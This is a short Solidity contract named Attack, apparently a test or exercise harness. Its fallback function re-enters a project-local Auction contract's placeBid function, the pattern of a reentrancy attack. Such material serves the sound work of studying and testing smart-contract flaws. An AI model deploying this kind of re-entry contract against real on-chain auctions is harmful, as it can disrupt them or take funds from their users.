// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "./Auction.sol";

contract Attack {
    Auction public auction;
    uint256 public itemId;

    constructor(Auction _auction) {
        auction = Auction(_auction);
    }

    function setItemId(uint256 _itemId) external {
        itemId = _itemId;
    }

    fallback() external payable {
        auction.placeBid(itemId);
    }

    receive() external payable {}
}
